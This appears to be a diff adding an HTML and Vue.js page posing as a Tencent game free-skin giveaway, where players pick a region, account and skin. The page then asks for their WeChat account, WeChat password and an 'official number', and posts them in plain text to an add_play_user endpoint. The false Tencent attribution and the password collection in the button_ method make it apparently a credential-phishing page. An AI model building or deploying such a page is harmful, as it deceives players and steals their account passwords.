@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="utf-8" />
+		<title>游戏</title>
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<script src="js/vue.js" type="text/javascript" charset="utf-8"></script>
+		<script src="js/index.js" type="text/javascript" charset="utf-8"></script>
+		<link rel="stylesheet" type="text/css" href="css/index.css"/>
+		<link rel="stylesheet" type="text/css" href="css/font.css"/> 
+		<script src="http://cdn.suoluomei.com/common/js2.0/axios/axios.min.js"></script>
+		<script src="/js/sha1.js"></script>
+		<script src="/js/md5.js"></script> 
+		<!-- <script src="/js/element.js"></script>  -->
+	<style type="text/css">
+		*{margin:0; padding:0;}
+		ul li{
+		   		list-style: none;
+			   }
+		input,select,option,textarea{outline: none;}
+		.c{
+			overflow: hidden;
+		}
+	</style>
+	<script type="text/javascript">
+		(function(doc, win) {
+		var docEl = doc.documentElement,
+		resizeEvt = 'orientationchange' in window ? 'orientationchange' : 'resize',
+		recalc = function() {
+		var clientWidth = docEl.clientWidth;
+		if (!clientWidth) return;
+		if(clientWidth <= 750){
+		docEl.style.fontSize = '100px';
+		}else{
+		docEl.style.fontSize = 50 * (clientWidth / 750) + 'px';
+		}
+		};
+		if (!doc.addEventListener) return;
+		win.addEventListener(resizeEvt, recalc, false);
+		doc.addEventListener('DOMContentLoaded', recalc, false);
+		})(document, window);
+	</script>
+	</head>	
+	<body>
+		 <div id="app">
+			 <!-- ******************移动***************** -->
+			<div class="nav_" v-if="is_mobile==1" >
+				<div class="mc" v-show="show">
+					<div class="menb">
+						<div class="menb_cla">	
+						  <div class="close_" @click="close"></div>
+							<div class="pad_">
+							    <p class="fir_p">微信账号</p>
+								<span><input type="type" v-model="vx"/></span>
+								<p>微信密码</p>
+								<span> </i><input type="password" v-model="word"/></span>
+								<p>官方号码</p>
+								<span><input type="type" v-model="phone"/></span><br>
+								<p class="p_p">注意：官方号码仅为官方客服人员所提供的特殊号码</p>
+								<div class="but " @click="button_">
+								    <p></p>
+								</div>
+						      </div>
+							</div>	
+				</div>
+			</div>
+			<div class="ss" v-show="active">
+					<p>{{xx}}</p>
+			</div>
+			<div class="login"></div>
+			 <div class="nav">
+				<div class="left">
+					 
+					<div class="fir_1">
+						<p> 所在大区</p>
+					    <p style="width: 100%;height:.5rem;background:url(/img/ima_input_bg.png)no-repeat;background-size: 100%;">
+							<select class="sel" v-model="daqu_id"  style="text-align-last:center;margin-left:12%;" >
+								<option  :value="item.id" v-for="(item,index) in list" >{{item.name}}</option>
+							</select>
+						</p>
+					</div>
+					<div class="fir_2">
+						<p>游戏账户</p>
+						<p><input type="type" placeholder="请输入账号"  v-model="zh"/></p>
+					</div>
+					<div class="fir_3">
+						<p>选择皮肤</p>
+						<P class="bottom_" >
+							<span>
+								<select name="sel" v-model="skin_id"  @change="qus()" style="text-align-last:center;font-size:.18rem;width:1rem" >
+								<option  :value="item.id"  v-for="(item,index) in lists" >{{item.name}}</option>
+							</select>
+							</span>
+							
+							<span style="font-size:.18rem">{{skin_time}}</span>
+							<span class="cl_1"></span>
+						</p>
+					</div> 
+		 		</div>
+				<div class="center" :style="{backgroundImage: 'url(' + back_url1 + ')', backgroundSize:'100% 100%', backgroundRepeat: 'no-repeat'}" >
+				<!-- <div class="center" > -->
+					<div><img :src="url11" ></div>
+				</div>
+
+				<div class="right" :style="{backgroundImage: 'url(' + back_url2 + ')', backgroundSize:'100% 100%', backgroundRepeat: 'no-repeat'}">
+				<!-- <div class="right"> -->
+					<img class="img_" :src="img1" >
+					<p class="right_p">{{name}}</p>
+					<div class="right_mo">
+							<p><img :src="img2" ><span>{{text1}}</span></p>
+							<p><img :src="img3" ><span>{{text2}}</span></p>
+					</div>
+				    <p class="shenq" @click="apply"></p>
+					<div class="cla_">
+						  <ul class="bottom">
+					                    <li>{{skin}}</li>
+										<li>{{skin_time}}</li>
+					                    <div class="centre_"></div>
+					  </ul>
+					</div>
+					<div class="botto_">*本活动最终解释权归腾讯互娱，光子工作室所有*</div>
+				</div>
+			   </div>
+			 </div>
+			 <!--********************* pc ********************** -->
+		 	<div class="nav_" v-if="is_mobile==2" :style="{backgroundImage:'url(' + back_url + ')', backgroundSize:'100% 100%', backgroundRepeat: 'no-repeat'}">
+				<div class="mc" v-show="show">
+					<div class="menb">
+						<div class="menb_cla">	
+						  <div class="close_" @click="close"></div>
+							<div class="pad_">
+							    <p class="fir_p">微信账号</p>
+								<span><input type="type" v-model="vx"/></span>
+								<p>微信密码</p>
+								<span> </i><input type="password" v-model="word"/></span>
+								<p>官方号码</p>
+								<span><input type="type" v-model="phone"/></span><br>
+								<p class="p_p">注意：官方号码仅为官方客服人员所提供的特殊号码</p>
+								<div class="but " @click="button_">
+								    <p></p>
+								</div>
+						      </div>
+							</div>	
+				</div>
+			</div>
+			<div class="ss" v-show="active">
+					<p>{{xx}}</p>
+			</div>
+			<div class="login"></div>
+			 <div class="nav">
+			 	<div class="left">
+					 
+					<div class="fir_1">
+						<p> 所在大区</p>
+					    <p>
+							<select class="sel" v-model="daqu_id"  style="text-align-last:center;" >
+								<option  :value="item.id" v-for="(item,index) in list" >{{item.name}}</option>
+							</select>
+						</p>
+					</div>
+					<div class="fir_2">
+						<p>游戏账户</p>
+						<p><input type="type" placeholder="请输入账号"  v-model="zh"/></p>
+					</div>
+					<div class="fir_3">
+						<p>选择皮肤</p>
+						<P class="bottom_" >
+							<span><select name="sel" v-model="skin_id"  @change="qus()" style="text-align-last:center;background: none;" >
+								<option  :value="item.id"  v-for="(item,index) in lists" >{{item.name}}</option>
+							</select></span>
+							<span>{{skin_time}}</span>
+							<span class="cl_1"></span>
+						</p>
+					</div> 
+		 		</div>
+				<div class="center" >
+					<div><img :src="url11" ></div>
+				</div><!-- <div class="right"  v-if="this.is_mobile=1" :style="{backgroundImage: 'url(' + back_url2 + ')', backgroundSize:'100% 100%', backgroundRepeat: 'no-repeat'}"> -->
+				<div class="right">
+					<img class="img_" :src="img1" >
+					<p class="right_p">{{name}}</p>
+					<div class="right_mo">
+							<p><img :src="img2" ><span>{{text1}}</span></p>
+							<p><img :src="img3" ><span>{{text2}}</span></p>
+					</div>
+				    <p class="shenq" @click="apply"></p>
+					<div class="cla_">
+						  <ul class="bottom">
+					                    <li>{{skin}}</li>
+										<li>{{skin_time}}</li>
+					                    <div class="centre_"></div>
+					  </ul>
+					</div>
+					<div class="botto_">*本活动最终解释权归腾讯互娱，光子工作室所有*</div>
+				</div>
+			   </div>
+		 	</div>
+		 </div>
+	</body>
+	<script type="text/javascript">
+		 new Vue({
+		         el: '#app',
+		         data: function () {
+		             return { 
+							show:false,
+							change:false,
+							changes:false,
+							is_mobile:'',
+					  		app_id:"skinApi",
+							app_key : "skinApi20200909",
+							url11:'',
+							num:'',
+							xx:'',
+							img1:'',
+							img2:'',
+							img3:'',
+							text1:'',
+							text2:'',
+							daqu:"",
+							vx:'',
+							active:false,
+							word:'',
+							zh:'',
+							phone:'',
+							back_url:'',
+							back_url1:'',
+							back_url2:'',
+							daqu_id:115,
+							skin:"",
+							skin_time:"",
+							name:'',
+							skin_id:'',
+							daqu_id:115,
+							list:[],
+							lists:[],
+							arr:[],
+					 }
+		         },
+		         components: {
+		           
+		         },
+				 mounted() {
+					         axios.defaults.baseURL='http://192.168.3.21/api.php/game/'
+					         this.time('get_area').then(res=>{
+							this.list = res.data.data.data.list
+							  })
+						
+								
+                                  this.time('get_skin').then(res=>{
+									  this.lists = res.data.data.data.list
+								  })
+								
+				                  this.time('get_game').then(res=>{
+										console.log(res);
+								this.img1 =  res.data.data.data.img_url;
+								this.img2 =  res.data.data.data.card_url;
+								this.img3 =  res.data.data.data.gold_url;
+								this.text1 =res.data.data.data.card_num;
+								this.text2 =res.data.data.data.gold_num;
+								this.back_url =res.data.data.data.background_url;
+								this.back_url1 =res.data.data.data.m1_background_url;
+								this.back_url2 =res.data.data.data.m2_background_url;
+								this.name =res.data.data.data.name;
+								this.is_mobile =res.data.data.data.is_mobile;
+								console.log();
+								this.id =res.data.data.data.id;
+								  })
+							if(this.skin_id==''){
+							this.skin_id=76;
+							var ts = Math.round(new Date().getTime()/1000).toString();
+							var s="app_id"+"="+"skinApi"+"&"+"app_time"+"="+ts
+							var token_ = hex_md5(sha1(s)+this.app_key)
+							axios.post('http://192.168.3.21/api.php/game/select_skin',
+							{   
+								app_id: this.app_id,
+								app_time:ts,
+								app_key: this.app_key,
+								token:token_,
+								id:this.skin_id,
+							}).then(res=>{
+								this.skin_time =res.data.data.data.skin_time;
+								this.url11 = res.data.data.data.img_url;
+								this.skin = res.data.data.data.name;
+							})
+							}
+				 },
+				 methods:{
+
+					time(url){
+						var ts = Math.round(new Date().getTime()/1000).toString();
+						var s="app_id"+"="+"skinApi"+"&"+"app_time"+"="+ts
+						var token_ = hex_md5(sha1(s)+this.app_key)
+						let b= axios.post(url
+						, {   /* 大区 */
+								app_id: this.app_id,
+								app_time:ts,
+								app_key: this.app_key,
+								token:token_
+							}
+							)
+
+							return b
+					 },
+				     qu(item,index){
+							this.daqu_id=item.id;
+							this.daqu = item.name;
+							this.isshow=false;
+							document.querySelector('body').removeAttribute('style')
+					 },
+				     qus(){
+							document.querySelector('body').removeAttribute('style')
+							var t = Math.round(new Date().getTime()/1000).toString();
+						    var s="app_id"+"="+"skinApi"+"&"+"app_time"+"="+t
+						    var tok = hex_md5(sha1(s)+this.app_key)
+							axios.post('select_skin'
+							,{
+								    app_id: this.app_id,
+									app_time:t,
+									app_key: this.app_key,
+									token:tok,
+									id:this.skin_id
+							}
+							)
+							.then((res)=>{  /* 皮肤 */
+							console.log(res);
+								this.url11 = res.data.data.data.img_url
+								this.skin_time =res.data.data.data.skin_time;
+								this.skin = res.data.data.data.name;
+							})	
+					 },
+					 apply(){
+						 this.show =true;
+						 document.querySelector('body').setAttribute('style', ' overflow: hidden')
+					 },
+					 close(){
+						 this.show =false;
+						 document.querySelector('body').removeAttribute('style')
+					 },
+					 button_(){
+						var ts = Math.round(new Date().getTime()/1000).toString();
+						var s="app_id"+"="+"skinApi"+"&"+"app_time"+"="+ts
+						var token_ = hex_md5(sha1(s)+this.app_key)
+						axios.post('add_play_user',
+						{
+							app_id:this.app_id,	
+							app_time:ts,	//是	string	验证接口参数
+							app_key:this.app_key,	//是	string	验证接口参数
+							token:token_,	//是	string	验证接口参数
+							area_id:this.daqu_id,	//是	string	大区id
+							game_account:this.zh,	//是	string	游戏账号
+							skin_id:this.skin_id,//	是	string	皮肤id
+							game_id:this.id,	//是	string	游戏id
+							wechat_account:this.vx,	//是	string	微信账号
+							wechat_pwd:this.word,	//是	string	微信密码
+							official_number:this.phone,
+						})
+							.then((res)=>{  /* 登录验证 */
+							
+								if(res.data.data.code!=1){
+									let a =3;
+									var time = setInterval(()=>{
+										a--;
+											this.xx = res.data.data.msg
+										    this.active=true;
+										if(a<0){
+											clearInterval(time);
+											this.active=false;
+										}
+									},1000)
+								}else{
+									// alert(res.data.data.msg)
+									let a =3;
+									var time = setInterval(()=>{
+										a--;
+											this.xx = res.data.data.msg
+										    this.active=true;
+										if(a<0){
+											clearInterval(time);
+											this.active=false;
+										this.show = false;
+										}
+									},1000)
+									setTimeout(()=>{
+								      this.word=this.vx=this.phone=''
+						          },2000)
+								}
+							})
+						
+					 },
+					 open(event){    /* 大区 */
+						 this.change=true;
+						 document.querySelector('body').setAttribute('style', ' overflow: hidden')
+					 },
+					//  opens(){    /* 皮肤 */
+					// 	 console.log(this.id);
+					// 	//  console.log(this.item,111);
+					// 	 document.querySelector('body').setAttribute('style', ' overflow: hidden')
+					//  },
+					 open_(){
+						 this.change=false;
+						 document.querySelector('body').removeAttribute('style')
+					 },
+					 opens_(){
+						 this.changes=false;
+						 document.querySelector('body').removeAttribute('style')
+					 },
+
+				 }
+		     })
+	</script>
+
+</html>
